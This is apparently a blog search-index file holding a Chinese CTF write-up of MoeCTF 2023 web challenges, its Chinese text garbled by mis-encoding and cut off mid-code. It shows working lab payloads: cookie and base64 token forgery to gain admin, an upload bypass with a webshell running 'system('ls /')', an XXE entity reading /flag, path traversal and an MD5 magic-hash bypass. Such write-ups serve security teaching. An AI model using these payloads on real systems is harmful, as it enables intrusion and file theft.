<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/07/16/MoeCTF2023-web/TT-web/"/>
      <url>/2024/07/16/MoeCTF2023-web/TT-web/</url>
      
        <content type="html"><![CDATA[<p><strong>å†™çš„ä¸å¥½å„ä½å¸ˆå‚…è§è°…</strong></p><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>CHALLENGE: http<br>DESCRIPTION: å¬è¯´è¿™ä¸ªhttpé‡Œè¿˜æœ‰ä¸ªä»€ä¹ˆä¸œè¥¿å«é¥¼å¹²ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯åƒçš„</p><p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œè²Œä¼¼å’Œæ•°æ®åŒ…æœ‰å…³ç³»ä½¿ç”¨ä»£ç†è½¯ä»¶è¿æ¥èŠ‚ç‚¹è®¿é—®å‘ç°æŒ‰ç…§è¦æ±‚æäº¤å‚æ•°å³å¯è·å¾—</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907111357690.png" alt="image-20230907111357690" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">POST /?UwU<span class="token operator">=</span>u HTTP/1.1Host: localhost:64168Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>sec-ch-ua: <span class="token string">"Chromium"</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"109"</span>, <span class="token string">"Not_A Brand"</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"99"</span>sec-ch-ua-mobile: ?0sec-ch-ua-platform: <span class="token string">"Windows"</span>Upgrade-Insecure-Requests: <span class="token number">1</span>User-Agent: MoeBrowserAccept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Sec-Fetch-Site: noneSec-Fetch-Mode: navigateX-Forwarded-For:127.0.0.1Sec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Cookie: <span class="token assign-left variable">character</span><span class="token operator">=</span>adminConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: <span class="token number">5</span><span class="token assign-left variable">Luv</span><span class="token operator">=</span>u</code></pre><p>æŒ‰ç…§è¦æ±‚æäº¤å‚æ•°å³å¯</p><h1 id="Webå…¥é—¨æŒ‡åŒ—"><a href="#Webå…¥é—¨æŒ‡åŒ—" class="headerlink" title="Webå…¥é—¨æŒ‡åŒ—"></a>Webå…¥é—¨æŒ‡åŒ—</h1><p>è§£å‡ºPDFç¼–ç å³å¯</p><h1 id="å½¼å²¸çš„flag"><a href="#å½¼å²¸çš„flag" class="headerlink" title="å½¼å²¸çš„flag"></a>å½¼å²¸çš„flag</h1><p>CHALLENGE: å½¼å²¸çš„flag<br>DESCRIPTION: æˆ‘ä»¬åœ¨æŸä¸ªå¹³è¡Œå®‡å®™ä¸­å¾—åˆ°äº†ä¸€æ®µmoectfç¾¤çš„èŠå¤©è®°å½•ï¼Œç²—å¿ƒçš„å‡ºé¢˜äººåœ¨è¿™ä¸ªèŠå¤©å¹³å°ä¸å°å¿ƒæ³„éœ²äº†è‡ªå·±çš„flag</p><p><strong>æ‰“å¼€å¯è§ä¸€ä¸ªèŠå¤©é¡µé¢</strong></p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151259825.png" alt="image-20230907151259825" loading="lazy"></p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151709517.png" alt="image-20230907151709517" loading="lazy"></p><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>CHALLENGE: cookie<br>DESCRIPTION: <strong>æœ¬é¢˜æ— éœ€æ‰«æå™¨&#x2F;çˆ†ç ´</strong><br>hint: readmeåªæ˜¯ä¸€ä¸ªæ ·ä¾‹ï¼Œä¸æ˜¯æ‹¿æ¥å¤åˆ¶çš„</p><p>æ ¹æ®é¢˜ç›®ç»™å‡ºçš„é™„ä»¶å¤§è‡´æ„æ€éœ€è¦æ³¨å†Œç”¨æˆ·æ¥ç™»å½•è·å–flag</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152055953.png" alt="image-20230907152055953" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">POST /register HTTP/1.1Host: localhost:62915sec-ch-ua: <span class="token string">"Chromium"</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"109"</span>, <span class="token string">"Not_A Brand"</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"99"</span>sec-ch-ua-mobile: ?0sec-ch-ua-platform: <span class="token string">"Windows"</span>Upgrade-Insecure-Requests: <span class="token number">1</span>User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/109.0.5414.120 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Cookie: <span class="token assign-left variable">character</span><span class="token operator">=</span>guestConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: <span class="token number">0</span><span class="token punctuation">&#123;</span>    <span class="token string">"username"</span><span class="token builtin class-name">:</span><span class="token string">"abc"</span>,    <span class="token string">"password"</span><span class="token builtin class-name">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152326552.png" alt="image-20230907152326552" loading="lazy"></p><p>è®¿é—®ç™»å½•æ¥å£ä½¿ç”¨æ³¨å†Œçš„è´¦å·è¿›è¡Œç™»å½•å¯å‘ç°å­˜åœ¨token</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152633221.png" alt="image-20230907152633221" loading="lazy"></p><pre class="language-none"><code class="language-none">eyJ1c2VybmFtZSI6ICJhYmMiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAidXNlciJ9&#123;&quot;username&quot;: &quot;abc&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;user&quot;&#125;base64</code></pre><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153346433.png" alt="image-20230907153346433" loading="lazy"></p><pre class="language-none"><code class="language-none">æ›´æ”¹tokenå³å¯eyJ1c2VybmFtZSI6ICJhYmMiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAiYWRtaW4ifQ&#x3D;&#x3D;&#123;&quot;username&quot;: &quot;abc&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;admin&quot;&#125;base64ç¼–ç </code></pre><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153530460.png" alt="image-20230907153530460" loading="lazy"></p><h1 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h1><p>CHALLENGE: gas!gas!gas!<br>DESCRIPTION: Kluttonè¿™ä¸ªå‡æœŸä¿¡å¿ƒæ»¡æ»¡åœ°å‡†å¤‡æŠŠé©¾ç…§æ‹¿ä¸‹ï¼Œäºæ˜¯ä»–ä»”ç»†åœ°å­¦ä¹ äº†å¥½å¤šæ¼‚ç§»è§†é¢‘ï¼Œè¿˜å‡†å¤‡äº†è¿™ä¹ˆä¸€ä¸ªèµ›åšèµ›è½¦åœºï¼›è¯¶ï¼Œä¸å¯¹ï¼Œå¼€è½¦å¥½åƒä¸æ˜¯ç”¨é”®ç›˜å¼€çš„ï¼Ÿ</p><p>æ‰“å¼€é¢˜ç›®éœ€è¦è¿ç»­å¯¹åšæŒäº”ä¼¦</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153929231.png" alt="image-20230907153929231" loading="lazy"></p><p>æŸ¥çœ‹æºç å‘ç°å­˜åœ¨å¦‚ä¸‹ç‰‡æ®µ</p><pre class="language-HTML" data-language="HTML"><code class="language-HTML">&lt;form action&#x3D;&quot;&#x2F;&quot; method&#x3D;&quot;POST&quot;&gt;   &lt;label for&#x3D;&quot;driver&quot;&gt;é€‰æ‰‹:&lt;&#x2F;label&gt;   &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;driver&quot; name&#x3D;&quot;driver&quot; required&gt;&lt;br&gt;&lt;br&gt;      &lt;label for&#x3D;&quot;steering_control&quot;&gt;æ–¹å‘æ§åˆ¶:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;steering_control&quot; name&#x3D;&quot;steering_control&quot; required&gt;     &lt;option value&#x3D;&quot;-1&quot;&gt;å·¦&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;0&quot; selected&gt;ç›´è¡Œ&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;å³&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;   &lt;label for&#x3D;&quot;throttle&quot;&gt;æ²¹é—¨æ§åˆ¶:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;throttle&quot; name&#x3D;&quot;throttle&quot; required&gt;     &lt;option value&#x3D;&quot;0&quot;&gt;æ¾å¼€&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;ä¿æŒ&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;2&quot; selected&gt;å…¨å¼€&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;æäº¤&quot;&gt; &lt;&#x2F;form&gt;</code></pre><p>æ ¹æ®è¿™äº›ä¿¡æ¯ç¼–å†™è„šæœ¬å³å¯</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://localhost:64461/'</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>req_post <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token operator">=</span>url<span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token string">'driver=q1&amp;steering_control=0&amp;throttle=2'</span><span class="token punctuation">,</span>    headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cookies = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>post_data <span class="token operator">=</span> <span class="token string">'driver=q1jun&amp;steering_control=0&amp;throttle=2'</span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>&lt;/div>'</span><span class="token punctuation">,</span>req_post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>req <span class="token operator">=</span> req_post<span class="token punctuation">.</span>textsteering_control <span class="token operator">=</span> <span class="token number">0</span>throttle <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'å¼¯é“å‘å·¦'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'å¼¯é“å‘å³'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'å¼¯é“ç›´è¡Œ'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token string">'ä¿æŒè¿™ä¸ªé€Ÿåº¦'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'æŠ“åœ°åŠ›å¤ªå¤§äº†'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">if</span> <span class="token string">'æŠ“åœ°åŠ›å¤ªå°äº†'</span> <span class="token keyword">in</span> req_post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control <span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle <span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    req_post <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>        url<span class="token operator">=</span>url<span class="token punctuation">,</span>        data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'driver=q1&amp;steering_control=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control<span class="token punctuation">&#125;</span></span><span class="token string">&amp;throttle=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>        headers<span class="token operator">=</span>headers    <span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>req_post<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token comment"># print(re.findall(r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>&lt;/div>',req_post.text)[0])</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cookies = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></code></pre><h1 id="moeå›¾åºŠ"><a href="#moeå›¾åºŠ" class="headerlink" title="moeå›¾åºŠ"></a>moeå›¾åºŠ</h1><p>CHALLENGE: moeå›¾åºŠ<br>DESCRIPTION: æˆ‘ä»¬å‡†å¤‡äº†ä¸€ä¸ªmoeå›¾åºŠç”¨äºä¸Šä¼ ä¸€äº›å›¾ç‰‡</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154510412.png" alt="image-20230907154510412" loading="lazy"></p><p>æ­£å¸¸çš„å›¾ç‰‡æ²¡å•¥é—®é¢˜ï¼Œphpå°±æ— æ³•è¿›è¡Œä¸Šä¼ </p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154700645.png" alt="image-20230907154700645" loading="lazy"></p><p>å®¡è®¡jsæºç å‘ç°ç”¨ç‚¹åˆ†éš”åç¼€åå­—å¤šåŠ ä¸€ä¸ªç‚¹å°±æŠŠå‰ä¸€ä¸ªç‚¹è¿›è¡Œäº†ç»•è¿‡</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155030664.png" alt="image-20230907155030664" loading="lazy"></p><p>å›¾ç‰‡ğŸå¯æˆåŠŸä¸Šä¼ </p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155156281.png" alt="image-20230907155156281" loading="lazy"></p><p>æ‰§è¡Œå‘½ä»¤å³å¯</p><pre class="language-none"><code class="language-none">?cmd&#x3D;system(%27ls%20&#x2F;%27);</code></pre><h1 id="è§£ä½ çš„åº§é©¾"><a href="#è§£ä½ çš„åº§é©¾" class="headerlink" title="è§£ä½ çš„åº§é©¾"></a>è§£ä½ çš„åº§é©¾</h1><p>CHALLENGE: äº†è§£ä½ çš„åº§é©¾<br>DESCRIPTION: ä¸ºäº†æè‡´åœ°æ¼‚ç§»ï¼Œæˆ‘ä»¬å‡†å¤‡äº†ä¸€ä¸ªç½‘ç«™ç”¨äºæŸ¥æ‰¾ä½ å–œæ¬¢çš„è½¦è½¦ï¼›å¬è¯´flagä¹Ÿæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡ä¸åœ¨ç½‘ç«™ç›®å½•æ”¾åœ¨æ ¹ç›®å½•åº”è¯¥æ²¡é—®é¢˜çš„å§ã€‚ã€‚ã€‚</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155632658.png" alt="image-20230907155632658" loading="lazy"></p><p>xmlæ³¨å…¥ä½¿ç”¨payloadå³å¯</p><pre class="language-none"><code class="language-none">xml_content&#x3D;%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%3C!DOCTYPE%20xxe%20%5B%3C!ELEMENT%20name%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fflag%22%20%3E%5D%3E%3Cxml%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fxml%3E</code></pre><h1 id="å¤§æµ·æé’ˆ"><a href="#å¤§æµ·æé’ˆ" class="headerlink" title="å¤§æµ·æé’ˆ"></a>å¤§æµ·æé’ˆ</h1><p>CHALLENGE: å¤§æµ·æé’ˆ<br>DESCRIPTION: è¯¥æ­»ï¼Œä¹‹å‰çš„å¹³è¡Œå®‡å®™ç”±äºflagçš„æ³„éœ²è¢«ä¸€è‚¡ç¥ç§˜åŠ›é‡æŠ¹å»ï¼Œæˆ‘ä»¬è„±ç¦»äº†ä¸é‚£ä¸ªå®‡å®™çš„è¿æ¥äº†ï¼ä¸è¿‡ä¸ç”¨æ‹…å¿ƒï¼Œçœ‹èµ·æ¥å‡ºé¢˜äººå‚»ä¹ä¹çš„æ˜¯å…·æœ‰æ³„éœ²flagçš„æ¦‚ç‡çš„ï¼Œæˆ‘ä»¬åªéœ€è¦è¿æ¥å¤šä¸ªå¹³è¡Œå®‡å®™â€¦ï¼ˆéš¾é“flagåœ¨å¤šå…ƒå®‡å®™é‡Œæ˜¯å…¨å±€å˜é‡å—ï¼‰</p><p>tips:ä»…æœ‰è¿™é“é¢˜è¦ç”¨åˆ°æ‰«æå™¨ï¼Œè¯·ä¸è¦å°†çˆ†ç ´é€Ÿåº¦è°ƒæ•´è¿‡å¿«ï¼Œflagæ˜¯ä¸€å®šèƒ½æ‰¾åˆ°çš„<br>ç¯å¢ƒï¼š<br><a href="http://101.42.178.83:7771/">http://101.42.178.83:7771/</a></p><p>æ‰“å¼€é¢˜ç›®å¯è§åªéœ€è¦bpè·‘ä¸€åˆ°ä¸€åƒçš„æ•°å­—å³å¯</p><pre class="language-none"><code class="language-none">use &#x2F;?id&#x3D;&lt;1-1000&gt; to connect to different parallel universes</code></pre><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160340776.png" alt="image-20230907160340776" loading="lazy"></p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160551761.png" alt="image-20230907160551761" loading="lazy"></p><h1 id="meoå›¾åºŠ"><a href="#meoå›¾åºŠ" class="headerlink" title="meoå›¾åºŠ"></a>meoå›¾åºŠ</h1><p>CHALLENGE: meoå›¾åºŠ<br>DESCRIPTION: æˆ‘ä»¬å‡†å¤‡äº†ä¸€ä¸ªmeo(?)å›¾åºŠç”¨äºä¸Šä¼ ä¸€äº›å›¾ç‰‡</p><pre class="language-none"><code class="language-none">å¯ä»¥ç›´æ¥ä¸Šä¼ phpä½†æ˜¯ä¸è¿›è¡Œè§£æï¼ŒæŸ¥çœ‹å‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«</code></pre><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907162316680.png" alt="image-20230907162316680" loading="lazy"></p><pre class="language-none"><code class="language-none">è¯»å–è¿™ä¸ªå‘ç°å¦‚ä¸‹æç¤ºhttp:&#x2F;&#x2F;localhost:54781&#x2F;images.php?name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;</code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$param1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$param2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$param1</span> <span class="token operator">!==</span> <span class="token variable">$param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$md5Param1</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$md5Param2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5Param1</span> <span class="token operator">==</span> <span class="token variable">$md5Param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.O!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o??"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"o.O?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o?"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>md50eè¿›è¡Œç»•è¿‡</p><pre class="language-none"><code class="language-none">param1&#x3D;QNKCDZO&amp;param2&#x3D;240610708</code></pre><h1 id="å¤ºå‘½åä¸‰æª"><a href="#å¤ºå‘½åä¸‰æª" class="headerlink" title="å¤ºå‘½åä¸‰æª"></a>å¤ºå‘½åä¸‰æª</h1><p>CHALLENGE: å¤ºå‘½åä¸‰æª<br>DESCRIPTION: å¤ºå‘½åä¸‰æªï¼ç„¶åæ˜¯å•¥æ¥ç€ï¼Ÿ</p><p>ä¸»é¡µå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hanxin.exe.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'å¤ºå‘½åä¸‰æª'</span><span class="token punctuation">;</span><span class="token variable">$new_visitor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">(</span><span class="token variable">$Chant</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$before</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$new_visitor</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$after</span> <span class="token operator">=</span> <span class="token class-name static-context">Deadly_Thirteen_Spears</span><span class="token operator">::</span><span class="token function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$before</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Movements: '</span> <span class="token operator">.</span> <span class="token variable">$after</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$after</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Even Caused A Glitch..."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å¾ˆæ˜æ˜¾æ˜¯ååºåˆ—åŒ–ï¼Œæ ¹æ®ä»£ç è¿˜æœ‰ä¸€ä¸ªâ€™Hanxin.exe.phpâ€™é¡µé¢</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Deadly_Thirteen_Spears</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> 